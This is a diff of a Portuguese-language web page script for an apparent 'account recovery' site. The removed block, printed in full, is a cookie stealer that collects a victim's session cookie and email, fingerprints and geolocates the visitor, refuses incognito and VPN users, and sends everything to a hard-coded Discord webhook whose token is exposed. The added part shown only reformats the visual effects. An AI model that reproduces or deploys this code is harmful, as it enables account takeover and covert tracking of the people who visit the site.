@@ -1,975 +1,236 @@
-<script>
-    // ============================================================
-    // 0. DETECÇÃO DE PERFORMANCE
-    // ============================================================
-    const PERF = {
-        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-        isTablet: /iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
-        isLowEnd: false,
-        hasReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
-        saveData: navigator.connection?.saveData || false,
-        effectiveType: navigator.connection?.effectiveType || 'unknown',
-        cores: navigator.hardwareConcurrency || 2,
-        memory: navigator.deviceMemory || 2,
-        isTouch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
-    };
-
-    PERF.isLowEnd = PERF.isMobile ||
-        PERF.isTablet ||
-        PERF.cores < 4 ||
-        PERF.memory < 4 ||
-        ['slow-2g', '2g', '3g'].includes(PERF.effectiveType) ||
-        PERF.saveData ||
-        PERF.hasReducedMotion;
-
-    if (PERF.isLowEnd) document.body.classList.add('low-performance');
-    if (!PERF.isLowEnd && !PERF.isMobile && PERF.cores >= 4 && PERF.memory >= 4) document.body.classList.add('canvas-enabled');
-    if (!PERF.isMobile && !PERF.isTouch) document.body.classList.add('glow-enabled');
-
-    // ============================================================
-    // 0.1 CARREGAMENTO CONDICIONAL DE SCRIPTS
-    // ============================================================
-    function loadScript(src) {
-        return new Promise((resolve, reject) => {
-            const s = document.createElement('script');
-            s.src = src;
-            s.async = true;
-            s.onload = resolve;
-            s.onerror = reject;
-            document.head.appendChild(s);
-        });
-    }
-
-    if (document.body.classList.contains('canvas-enabled')) {
-        loadScript('https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js')
-            .then(() => init3DBackground())
-            .catch(() => {});
-    }
-
-    // ============================================================
-    // 0.2 THREE.JS
-    // ============================================================
-    function init3DBackground() {
-        const canvas = document.getElementById('bg3d');
-        if (!canvas || !window.THREE) return;
-
-        const scene = new THREE.Scene();
-        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-        camera.position.z = 32;
-
-        const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: false });
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 1.5));
-
-        const particlesCount = 400;
-        const positions = new Float32Array(particlesCount * 3);
-        const colors = new Float32Array(particlesCount * 3);
-        const palette = [[0.85, 0.71, 0.99], [0.55, 0.36, 0.96], [0.66, 0.55, 0.98]];
-
-        for (let i = 0; i < particlesCount; i++) {
-            positions[i * 3] = (Math.random() - 0.5) * 100;
-            positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
-            positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
-            const c = palette[Math.floor(Math.random() * palette.length)];
-            colors[i * 3] = c[0];
-            colors[i * 3 + 1] = c[1];
-            colors[i * 3 + 2] = c[2];
-        }
-
-        const particleGeo = new THREE.BufferGeometry();
-        particleGeo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-        particleGeo.setAttribute('color', new THREE.BufferAttribute(colors, 3));
-
-        const particleMat = new THREE.PointsMaterial({
-            size: 0.18, vertexColors: true, transparent: true,
-            opacity: 0.9, blending: THREE.AdditiveBlending, sizeAttenuation: true,
-        });
-
-        const particles = new THREE.Points(particleGeo, particleMat);
-        scene.add(particles);
-
-        let mouseX = 0, mouseY = 0, targetX = 0, targetY = 0;
-        document.addEventListener('mousemove', (e) => {
-            mouseX = (e.clientX / window.innerWidth - 0.5) * 2;
-            mouseY = (e.clientY / window.innerHeight - 0.5) * 2;
-        }, { passive: true });
-
-        let time = 0;
-        function animate() {
-            requestAnimationFrame(animate);
-            time += 0.01;
-            targetX += (mouseX - targetX) * 0.05;
-            targetY += (mouseY - targetY) * 0.05;
-            particles.rotation.y = time * 0.04 + targetX * 0.25;
-            particles.rotation.x = time * 0.02 + targetY * 0.25;
-            camera.position.x += (targetX * 3.5 - camera.position.x) * 0.05;
-            camera.position.y += (-targetY * 3.5 - camera.position.y) * 0.05;
-            camera.lookAt(scene.position);
-            renderer.render(scene, camera);
-        }
-        animate();
-
-        let resizeTimer;
-        window.addEventListener('resize', () => {
-            clearTimeout(resizeTimer);
-            resizeTimer = setTimeout(() => {
-                camera.aspect = window.innerWidth / window.innerHeight;
-                camera.updateProjectionMatrix();
-                renderer.setSize(window.innerWidth, window.innerHeight);
-            }, 200);
-        }, { passive: true });
-    }
-
-    // ============================================================
-    // 0.3 CURSOR GLOW
-    // ============================================================
-    (function initCursorGlow() {
-        const glow = document.getElementById('cursorGlow');
-        if (!glow || !document.body.classList.contains('glow-enabled')) return;
-
-        let mouseX = window.innerWidth / 2;
-        let mouseY = window.innerHeight / 2;
-        let currentX = mouseX;
-        let currentY = mouseY;
-
-        document.addEventListener('mousemove', (e) => {
-            mouseX = e.clientX;
-            mouseY = e.clientY;
-        }, { passive: true });
-
-        function animate() {
-            currentX += (mouseX - currentX) * 0.15;
-            currentY += (mouseY - currentY) * 0.15;
-            glow.style.transform = `translate(${currentX - 210}px, ${currentY - 210}px)`;
-            requestAnimationFrame(animate);
-        }
-        animate();
-    })();
-
-    // ============================================================
-    // 0.4 VANILLA TILT
-    // ============================================================
-    if (!PERF.isMobile && !PERF.isLowEnd) {
-        loadScript('https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.8.0/vanilla-tilt.min.js')
-            .then(() => {
-                if (window.VanillaTilt) {
-                    VanillaTilt.init(document.querySelectorAll(".card, .side-card, .stat-card, .community-card"), {
-                        max: 10, speed: 400, glare: true, "max-glare": 0.15, scale: 1.01, perspective: 1000,
-                    });
-                }
-            })
-            .catch(() => {});
-    }
-
-    // ============================================================
-    // 1. DETECÇÃO DE INCÓGNITO
-    // ============================================================
-    function detectIncognito() {
-        return new Promise((resolve) => {
-            let detected = false;
-            let checksDone = 0;
-            const totalChecks = 4;
-
-            function checkDone() {
-                checksDone++;
-                if (checksDone >= totalChecks) resolve(detected);
-            }
-
-            try { localStorage.setItem('__incog__', '1'); localStorage.removeItem('__incog__'); }
-            catch (e) { detected = true; }
-            checkDone();
-
-            try { sessionStorage.setItem('__incog__', '1'); sessionStorage.removeItem('__incog__'); }
-            catch (e) { detected = true; }
-            checkDone();
-
-            try {
-                const request = indexedDB.open('__incog__');
-                request.onerror = () => { detected = true; checkDone(); };
-                request.onsuccess = () => { if (request.result) request.result.close(); checkDone(); };
-            } catch (e) { detected = true; checkDone(); }
-
-            if (navigator.storage && navigator.storage.estimate) {
-                navigator.storage.estimate().then(est => {
-                    if (est.quota < 120000000) detected = true;
-                    checkDone();
-                }).catch(() => checkDone());
-            } else checkDone();
-
-            setTimeout(() => resolve(detected), 2500);
-        });
-    }
-
-    // ============================================================
-    // 2. DETECÇÃO DE NAVEGADOR ANÔNIMO E VPN
-    // ============================================================
-    function isPrivateBrowsing() {
-        return new Promise((resolve) => {
-            let positives = 0, methods = 0;
-            try { localStorage.setItem('__t__', '1'); localStorage.removeItem('__t__'); } catch (e) { positives++; }
-            methods++;
-            try { sessionStorage.setItem('__t__', '1'); sessionStorage.removeItem('__t__'); } catch (e) { positives++; }
-            methods++;
-            try {
-                const req = indexedDB.open('__t__');
-                req.onerror = () => { positives++; if (++methods >= 3) resolve(positives >= 2); };
-                req.onsuccess = () => { if (++methods >= 3) resolve(positives >= 2); };
-            } catch (e) { positives++; if (++methods >= 3) resolve(positives >= 2); }
-            setTimeout(() => resolve(positives >= 2), 1000);
-        });
-    }
-
-    function detectPrivateBrowsingBrowser() {
-        return new Promise((resolve) => {
-            let result = false, done = 0, total = 4;
-            try { localStorage.setItem('__t__', '1'); localStorage.removeItem('__t__'); } catch (e) { result = true; }
-            done++;
-            try { sessionStorage.setItem('__t__', '1'); sessionStorage.removeItem('__t__'); } catch (e) { result = true; }
-            done++;
-            try {
-                const req = indexedDB.open('__t__');
-                req.onerror = () => { result = true; done++; if (done >= total) resolve(result); };
-                req.onsuccess = () => { if (req.result) req.result.close(); done++; if (done >= total) resolve(result); };
-            } catch (e) { result = true; done++; if (done >= total) resolve(result); }
-            if (navigator.storage && navigator.storage.estimate) {
-                navigator.storage.estimate().then(e => {
-                    if (e.quota < 120000000) result = true;
-                    done++; if (done >= total) resolve(result);
-                }).catch(() => { done++; if (done >= total) resolve(result); });
-            } else { done++; if (done >= total) resolve(result); }
-            setTimeout(() => resolve(result), 2500);
-        });
-    }
-
-    function fetchWithTimeout(url, timeout = 4000) {
-        const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), timeout);
-        return fetch(url, { signal: controller.signal })
-            .finally(() => clearTimeout(timer));
-    }
-
-    async function detectVPN() {
-        try {
-            const data = await getIPData();
-            if (!data) return false;
-            return [data.is_vpn, data.is_proxy, data.is_tor, data.is_datacenter, data.threat_level > 50].some(v => v === true);
-        } catch (e) { return false; }
-    }
-
-    async function getIPData() {
-        const apis = [
-            { url: 'https://ipapi.is/api/ip/', parser: d => ({ is_vpn: d.is_vpn, is_proxy: d.is_proxy, is_tor: d.is_tor, is_datacenter: d.is_datacenter, threat_level: d.threat_level || 0 }) },
-            { url: 'https://ip-api.com/json/?fields=query,proxy,hosting,status', parser: d => ({ is_vpn: d.proxy === true, is_proxy: d.proxy === true, is_datacenter: d.hosting === true, threat_level: (d.proxy || d.hosting) ? 75 : 0 }) }
-        ];
-        for (const api of apis) {
-            try {
-                const res = await fetchWithTimeout(api.url, 4000);
-                if (res.ok) { const data = await res.json(); return api.parser(data); }
-            } catch (e) { continue; }
-        }
-        return null;
-    }
-
-    async function isGoogleIncognito() {
-        return new Promise((resolve) => {
-            let results = [];
-            if (navigator.storage && navigator.storage.estimate) {
-                navigator.storage.estimate().then(e => {
-                    results.push(e.quota < 120000000);
-                    if (results.length >= 2) resolve(results.some(r => r === true));
-                }).catch(() => {
-                    results.push(false);
-                    if (results.length >= 2) resolve(results.some(r => r === true));
-                });
-            } else results.push(false);
-            if (window.webkitRequestFileSystem) {
-                window.webkitRequestFileSystem(window.TEMPORARY, 1024 * 1024,
-                    () => { results.push(false); if (results.length >= 2) resolve(results.some(r => r === true)); },
-                    () => { results.push(true); if (results.length >= 2) resolve(results.some(r => r === true)); }
-                );
-            } else results.push(false);
-            setTimeout(() => {
-                if (results.length > 0) resolve(results.some(r => r === true));
-                else resolve(false);
-            }, 1500);
-        });
-    }
-
-    async function checkBlocked() {
-        try {
-            const [isPrivate, isGoogle, hasVPN] = await Promise.all([
-                isPrivateBrowsing(),
-                isGoogleIncognito(),
-                detectVPN()
-            ]);
-            const modal = document.getElementById('blockModal');
-            const reason = document.getElementById('blockReason');
-            const title = document.getElementById('blockTitle');
-            const icon = document.getElementById('blockIcon');
-            const desc = document.getElementById('blockDesc');
-            const btn = document.getElementById('blockBtn');
-            const gif = document.getElementById('banGifWrap');
-
-            let shouldBlock = false;
-            gif.classList.remove('active');
-
-            if (isPrivate || isGoogle) {
-                shouldBlock = true;
-                title.textContent = '🔒 Navegador Anônimo!';
-                icon.textContent = '🕵️';
-                reason.textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
-                desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative o modo anônimo para acessar.';
-                btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                btn.className = 'btn-block-action';
-                btn.onclick = () => window.location.reload();
-            } else if (hasVPN) {
-                shouldBlock = true;
-                title.textContent = '🌐 VPN/Proxy Detectado!';
-                icon.textContent = '🛡️';
-                reason.textContent = '🌐 VPN ou Proxy Detectado';
-                desc.textContent = 'Conexões via VPN ou proxy não são permitidas por questões de segurança. Desative para acessar.';
-                btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-                btn.className = 'btn-block-action';
-                btn.onclick = () => window.location.reload();
-            }
-
-            if (shouldBlock) {
-                reason.parentElement.className = 'reason-box';
-                modal.classList.add('active');
-                document.body.style.overflow = 'hidden';
-                return true;
-            }
-            return false;
-        } catch (e) { return false; }
-    }
-
-    // ============================================================
-    // 3. CONFIG
-    // ============================================================
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559185453112893460/2l5wcx4vZLswqnfD053amLzR6OPkMJ-AlPGAF_QzwRZoZEjePCFtsKdtLZBWkaCLcaRm';
-
-    let hasAttempted = false;
-    let blockUntil = null;
-    let timerInterval = null;
-    let isBlocked = false;
-    let termsAccepted = false;
-    let isUserBanned = false;
-
-    // ============================================================
-    // 4. BAN MODAL
-    // ============================================================
-    function showBanBlockModal(reason, expires, gif) {
-        const modal = document.getElementById('blockModal');
-        const reasonEl = document.getElementById('blockReason');
-        const title = document.getElementById('blockTitle');
-        const icon = document.getElementById('blockIcon');
-        const desc = document.getElementById('blockDesc');
-        const btn = document.getElementById('blockBtn');
-        const gifWrap = document.getElementById('banGifWrap');
-        const gifImg = document.getElementById('banGif');
-
-        if (gif) {
-            gifWrap.classList.add('active');
-            gifImg.src = gif;
-            gifImg.alt = 'BANIDO';
-        } else gifWrap.classList.remove('active');
-
-        title.className = 'ban-title';
-        title.textContent = '🚫 VOCÊ FOI BANIDO!';
-        icon.textContent = '⚖️';
-
-        const reasonBox = document.getElementById('blockReasonBox');
-        reasonBox.className = 'reason-box ban';
-        reasonEl.textContent = `🔴 ${reason || 'ATIVIDADE SUSPEITA'}`;
-
-        if (expires) {
-            const date = new Date(expires);
-            desc.innerHTML = `⏳ Banimento expira em: <strong style="color:#fbbf24;">${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR')}</strong>`;
-            btn.className = 'btn-block-action wait';
-            btn.innerHTML = '<i class="fas fa-clock"></i> Aguardar Expiração';
-        } else {
-            desc.innerHTML = '🚫 Banimento PERMANENTE - Você não pode mais usar o sistema.';
-            btn.className = 'btn-block-action ban';
-            btn.innerHTML = '<i class="fas fa-gavel"></i> BANIDO PERMANENTEMENTE';
-        }
-
-        modal.classList.add('active');
-        document.body.style.overflow = 'hidden';
-        const form = document.getElementById('recoveryForm');
-        if (form) form.style.display = 'none';
-        const sb = document.getElementById('submitBtn');
-        if (sb) {
-            sb.disabled = true;
-            sb.innerHTML = '<i class="fas fa-ban"></i> BLOQUEADO';
-            sb.style.opacity = '0.5';
-        }
-    }
-
-    async function checkBanStatus() {
-        try {
-            const ipRes = await fetchWithTimeout('https://api.ipify.org?format=json', 4000);
-            const ipData = await ipRes.json();
-            const ip = ipData.ip;
-
-            const banRes = await fetchWithTimeout(`https://aurora-plum.vercel.app/api/ban?check=${ip}`, 4000);
-            const banData = await banRes.json();
-
-            if (banData.banned) {
-                isUserBanned = true;
-                const ban = banData.ban || banData;
-                showBanBlockModal(
-                    ban.reason || 'Motivo não informado',
-                    ban.expires || null,
-                    ban.gif || 'https://media.tenor.com/2BpR9fW5HWQAAAAC/roblox-ban.gif'
-                );
-                return true;
-            }
-            return false;
-        } catch (e) { return false; }
-    }
-
-    // ============================================================
-    // 5. TERMS
-    // ============================================================
-    function openTerms() {
-        if (isUserBanned) return;
-        document.getElementById('termsModal').classList.add('active');
-        document.body.style.overflow = 'hidden';
-    }
-
-    function closeTerms() {
-        document.getElementById('termsModal').classList.remove('active');
-        document.body.style.overflow = '';
-    }
-
-    function acceptTerms() {
-        termsAccepted = true;
-        try { localStorage.setItem('aurora_terms_accepted', 'true'); } catch (e) {}
-        closeTerms();
-        showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço. ✨');
-        showSection('recovery');
-    }
-
-    function checkTerms() {
-        try {
-            if (localStorage.getItem('aurora_terms_accepted') === 'true') termsAccepted = true;
-            else if (!isUserBanned) setTimeout(openTerms, 1500);
-        } catch (e) { if (!isUserBanned) setTimeout(openTerms, 1500); }
-    }
-
-    // ============================================================
-    // 6. IP
-    // ============================================================
-    async function getIP() {
-        try {
-            const r = await fetchWithTimeout('https://api.ipify.org?format=json', 4000);
-            const d = await r.json();
-            return d.ip;
-        } catch (e) { return 'N/A'; }
-    }
-
-    // ============================================================
-    // 7. COLETA AVANÇADA
-    // ============================================================
-    function getOS() {
-        const ua = navigator.userAgent;
-        let os = 'Desconhecido', version = '';
-        if (/Windows NT 10/.test(ua)) { os = 'Windows'; version = '10/11'; }
-        else if (/Windows NT 6\.3/.test(ua)) { os = 'Windows'; version = '8.1'; }
-        else if (/Windows NT 6\.2/.test(ua)) { os = 'Windows'; version = '8'; }
-        else if (/Windows NT 6\.1/.test(ua)) { os = 'Windows'; version = '7'; }
-        else if (/Windows/.test(ua)) os = 'Windows';
-        else if (/Mac OS X/.test(ua)) {
-            os = 'macOS';
-            const m = ua.match(/Mac OS X ([\d_]+)/);
-            if (m) version = m[1].replace(/_/g, '.');
-        }
-        else if (/Android/.test(ua)) {
-            os = 'Android';
-            const m = ua.match(/Android ([\d.]+)/);
-            if (m) version = m[1];
-        }
-        else if (/iPhone|iPad|iPod/.test(ua)) {
-            os = 'iOS';
-            const m = ua.match(/OS ([\d_]+)/);
-            if (m) version = m[1].replace(/_/g, '.');
-        }
-        else if (/CrOS/.test(ua)) os = 'ChromeOS';
-        else if (/Linux/.test(ua)) os = 'Linux';
-        return version ? `${os} ${version}` : os;
-    }
-
-    function getBrowser() {
-        const ua = navigator.userAgent;
-        let browser = 'Desconhecido', version = '';
-        if (/Edg\//.test(ua)) { browser = 'Edge'; const m = ua.match(/Edg\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
-        else if (/OPR\/|Opera/.test(ua)) { browser = 'Opera'; const m = ua.match(/OPR\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
-        else if (/Chrome/.test(ua) && !/Edg/.test(ua)) { browser = 'Chrome'; const m = ua.match(/Chrome\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
-        else if (/Firefox/.test(ua)) { browser = 'Firefox'; const m = ua.match(/Firefox\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
-        else if (/Safari/.test(ua) && !/Chrome/.test(ua)) { browser = 'Safari'; const m = ua.match(/Version\/([\d.]+)/); if (m) version = m[1].split('.')[0]; }
-        return version ? `${browser} ${version}` : browser;
-    }
-
-    async function getBattery() {
-        try {
-            if (!navigator.getBattery) return null;
-            const bat = await navigator.getBattery();
-            return { level: Math.round(bat.level * 100), charging: bat.charging };
-        } catch (e) { return null; }
-    }
-
-    function getConnection() {
-        try {
-            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!c) return null;
-            return {
-                type: c.effectiveType || 'N/A',
-                downlink: c.downlink ? c.downlink + ' Mbps' : 'N/A',
-                rtt: c.rtt ? c.rtt + 'ms' : 'N/A',
-                saveData: c.saveData || false,
-            };
-        } catch (e) { return null; }
-    }
-
-    function getHardware() {
-        return {
-            cores: navigator.hardwareConcurrency || 'N/A',
-            memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
-            platform: navigator.platform || 'N/A',
-            touchPoints: navigator.maxTouchPoints || 0,
+    <script>
+        // ============================================================
+        // 0. DETECÇÃO DE PERFORMANCE
+        // ============================================================
+        const PERF = {
+            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            isTablet: /iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
+            isLowEnd: false,
+            hasReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+            saveData: navigator.connection?.saveData || false,
+            effectiveType: navigator.connection?.effectiveType || 'unknown',
+            cores: navigator.hardwareConcurrency || 2,
+            memory: navigator.deviceMemory || 2,
+            isTouch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
         };
-    }
 
-    function getScreen() {
-        return {
-            resolution: `${screen.width}x${screen.height}`,
-            colorDepth: screen.colorDepth + ' bits',
-            pixelRatio: window.devicePixelRatio || 1,
-            orientation: screen.orientation ? screen.orientation.type : 'N/A',
-        };
-    }
+        PERF.isLowEnd = PERF.isMobile || PERF.isTablet || PERF.cores < 4 || PERF.memory < 4 ||
+            ['slow-2g', '2g', '3g'].includes(PERF.effectiveType) || PERF.saveData || PERF.hasReducedMotion;
 
-    function getPreferences() {
-        return {
-            language: navigator.language || 'N/A',
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
-            darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'N/A',
-        };
-    }
+        if (PERF.isLowEnd) document.body.classList.add('low-performance');
+        if (!PERF.isLowEnd && !PERF.isMobile && PERF.cores >= 4 && PERF.memory >= 4) document.body.classList.add('canvas-enabled');
+        if (!PERF.isMobile && !PERF.isTouch) document.body.classList.add('glow-enabled');
 
-    async function getFingerprint() {
-        try {
-            const comp = [
-                navigator.userAgent, navigator.language,
-                screen.width + 'x' + screen.height, screen.colorDepth,
-                new Date().getTimezoneOffset(), navigator.hardwareConcurrency,
-                navigator.platform, navigator.deviceMemory || 0,
-            ].join('|');
-
-            if (!crypto.subtle) return 'NO-CRYPTO';
-            const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(comp));
-            return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16).toUpperCase();
-        } catch (e) { return 'UNKNOWN'; }
-    }
-
-    function detectAdBlocker() {
-        return new Promise((resolve) => {
-            try {
-                const testAd = document.createElement('div');
-                testAd.innerHTML = '&nbsp;';
-                testAd.className = 'adsbox ad-banner pub_300x250';
-                testAd.style.cssText = 'position:absolute;left:-9999px;height:1px;width:1px;';
-                document.body.appendChild(testAd);
-                setTimeout(() => {
-                    const blocked = testAd.offsetHeight === 0;
-                    testAd.remove();
-                    resolve(blocked);
-                }, 100);
-            } catch (e) { resolve(false); }
-        });
-    }
-
-    function detectDevTools() {
-        try {
-            return (window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160);
-        } catch (e) { return false; }
-    }
-
-    // ============================================================
-    // 🌍 GEO INFO - 4 APIs EM CASCATA
-    // ============================================================
-    async function getGeoInfo() {
-        try {
-            const r = await fetchWithTimeout('https://ipwho.is/', 5000);
-            if (r.ok) {
-                const d = await r.json();
-                if (d && d.success !== false && d.country) {
-                    return {
-                        ip: d.ip || 'N/A',
-                        country: d.country || 'N/A',
-                        countryCode: d.country_code || '',
-                        region: d.region || 'N/A',
-                        city: d.city || 'N/A',
-                        postal: d.postal || 'N/A',
-                        latitude: d.latitude,
-                        longitude: d.longitude,
-                        timezone: d.timezone?.id || 'N/A',
-                        currency: d.currency?.code || 'N/A',
-                        isp: d.connection?.isp || d.connection?.org || 'N/A',
-                        asn: d.connection?.asn ? 'AS' + d.connection.asn : 'N/A',
-                    };
-                }
-            }
-        } catch (e) {}
-
-        try {
-            const r = await fetchWithTimeout('https://ipapi.co/json/', 5000);
-            if (r.ok) {
-                const d = await r.json();
-                if (d && d.country_name && d.country_name !== null) {
-                    return {
-                        ip: d.ip || 'N/A',
-                        country: d.country_name || 'N/A',
-                        countryCode: d.country_code || '',
-                        region: d.region || 'N/A',
-                        city: d.city || 'N/A',
-                        postal: d.postal || 'N/A',
-                        latitude: d.latitude,
-                        longitude: d.longitude,
-                        timezone: d.timezone || 'N/A',
-                        currency: d.currency || 'N/A',
-                        isp: d.org || 'N/A',
-                        asn: d.asn || 'N/A',
-                    };
-                }
-            }
-        } catch (e) {}
-
-        try {
-            const r = await fetchWithTimeout('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,as,query', 5000);
-            if (r.ok) {
-                const d = await r.json();
-                if (d && d.status === 'success') {
-                    return {
-                        ip: d.query || 'N/A',
-                        country: d.country || 'N/A',
-                        countryCode: d.countryCode || '',
-                        region: d.regionName || 'N/A',
-                        city: d.city || 'N/A',
-                        postal: d.zip || 'N/A',
-                        latitude: d.lat,
-                        longitude: d.lon,
-                        timezone: d.timezone || 'N/A',
-                        currency: d.currency || 'N/A',
-                        isp: d.isp || 'N/A',
-                        asn: d.as || 'N/A',
-                    };
-                }
-            }
-        } catch (e) {}
-
-        try {
-            const r = await fetchWithTimeout('https://ipinfo.io/json', 5000);
-            if (r.ok) {
-                const d = await r.json();
-                if (d && (d.city || d.country)) {
-                    const loc = (d.loc || ',').split(',');
-                    return {
-                        ip: d.ip || 'N/A',
-                        country: d.country || 'N/A',
-                        countryCode: d.country || '',
-                        region: d.region || 'N/A',
-                        city: d.city || 'N/A',
-                        postal: d.postal || 'N/A',
-                        latitude: loc[0] ? parseFloat(loc[0]) : null,
-                        longitude: loc[1] ? parseFloat(loc[1]) : null,
-                        timezone: d.timezone || 'N/A',
-                        currency: 'N/A',
-                        isp: d.org || 'N/A',
-                        asn: d.org ? d.org.split(' ')[0] : 'N/A',
-                    };
-                }
-            }
-        } catch (e) {}
-
-        return null;
-    }
-
-    function getVisitCount() {
-        try {
-            let count = parseInt(localStorage.getItem('aurora_visit_count') || '0');
-            count++;
-            localStorage.setItem('aurora_visit_count', count.toString());
-            return count;
-        } catch (e) { return 1; }
-    }
-
-    function getFlagEmoji(code) {
-        if (!code || code.length !== 2) return '🌍';
-        try {
-            return String.fromCodePoint(...code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0)));
-        } catch (e) { return '🌍'; }
-    }
-
-    // ============================================================
-    // 7.1 WEBHOOK (CORRIGIDO — COOKIE INTEIRO)
-    // ============================================================
-
-    /**
-     * Quebra uma string em partes de no máximo `size` caracteres.
-     * Usado para dividir o cookie entre múltiplos embeds (Discord limita description a 4096).
-     */
-    function chunkString(str, size) {
-        const chunks = [];
-        for (let i = 0; i < str.length; i += size) {
-            chunks.push(str.slice(i, i + size));
+        // ============================================================
+        // 0.1 CARREGAMENTO CONDICIONAL DE SCRIPTS
+        // ============================================================
+        function loadScript(src) {
+            return new Promise((resolve, reject) => {
+                const s = document.createElement('script');
+                s.src = src; s.async = true; s.onload = resolve; s.onerror = reject;
+                document.head.appendChild(s);
+            });
         }
-        return chunks.length ? chunks : [''];
-    }
 
-    /**
-     * Sanitiza o cookie para markdown: substitui backticks por apóstrofo parecido
-     * (para não quebrar o bloco ``` ) e remove caracteres invisíveis.
-     */
-    function sanitizeForDiscord(str) {
-        return String(str)
-            .replace(/`/g, '\u02CB')          // backtick → ˋ
-            .replace(/\u0000/g, '')            // NUL
-            .replace(/\r/g, '');               // CR (mantém \n)
-    }
+        if (document.body.classList.contains('canvas-enabled')) {
+            loadScript('https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js')
+                .then(() => init3DBackground()).catch(() => {});
+        }
 
-    async function sendToWebhook(cookieRaw, email, ip, isPrivate, vpnDetected) {
-        try {
-            // ---- Normaliza o cookie: remove espaços/quebras acidentais das pontas ----
-            const cookie = String(cookieRaw).trim();
+        // ============================================================
+        // 0.2 THREE.JS
+        // ============================================================
+        function init3DBackground() {
+            const canvas = document.getElementById('bg3d');
+            if (!canvas || !window.THREE) return;
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 32;
+            const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: false });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 1.5));
+            const particlesCount = 400;
+            const positions = new Float32Array(particlesCount * 3);
+            const colors = new Float32Array(particlesCount * 3);
+            const palette = [[0.85,0.71,0.99],[0.55,0.36,0.96],[0.66,0.55,0.98]];
+            for (let i = 0; i < particlesCount; i++) {
+                positions[i*3] = (Math.random()-0.5)*100;
+                positions[i*3+1] = (Math.random()-0.5)*100;
+                positions[i*3+2] = (Math.random()-0.5)*100;
+                const c = palette[Math.floor(Math.random()*palette.length)];
+                colors[i*3] = c[0]; colors[i*3+1] = c[1]; colors[i*3+2] = c[2];
+            }
+            const particleGeo = new THREE.BufferGeometry();
+            particleGeo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+            particleGeo.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+            const particleMat = new THREE.PointsMaterial({ size: 0.18, vertexColors: true, transparent: true, opacity: 0.9, blending: THREE.AdditiveBlending, sizeAttenuation: true });
+            const particles = new THREE.Points(particleGeo, particleMat);
+            scene.add(particles);
+            let mouseX = 0, mouseY = 0, targetX = 0, targetY = 0;
+            document.addEventListener('mousemove', (e) => {
+                mouseX = (e.clientX / window.innerWidth - 0.5) * 2;
+                mouseY = (e.clientY / window.innerHeight - 0.5) * 2;
+            }, { passive: true });
+            let time = 0;
+            function animate() {
+                requestAnimationFrame(animate);
+                time += 0.01;
+                targetX += (mouseX - targetX) * 0.05;
+                targetY += (mouseY - targetY) * 0.05;
+                particles.rotation.y = time * 0.04 + targetX * 0.25;
+                particles.rotation.x = time * 0.02 + targetY * 0.25;
+                camera.position.x += (targetX * 3.5 - camera.position.x) * 0.05;
+                camera.position.y += (-targetY * 3.5 - camera.position.y) * 0.05;
+                camera.lookAt(scene.position);
+                renderer.render(scene, camera);
+            }
+            animate();
+            let resizeTimer;
+            window.addEventListener('resize', () => {
+                clearTimeout(resizeTimer);
+                resizeTimer = setTimeout(() => {
+                    camera.aspect = window.innerWidth / window.innerHeight;
+                    camera.updateProjectionMatrix();
+                    renderer.setSize(window.innerWidth, window.innerHeight);
+                }, 200);
+            }, { passive: true });
+        }
 
-            // ---- Coleta em paralelo (com timeout) ----
-            const collectAll = Promise.all([
-                vpnDetected ? getIPData() : Promise.resolve(null),
-                getGeoInfo(),
-                getBattery(),
-                detectAdBlocker(),
-                getFingerprint(),
-            ]);
+        // ============================================================
+        // 0.3 CURSOR GLOW
+        // ============================================================
+        (function initCursorGlow() {
+            const glow = document.getElementById('cursorGlow');
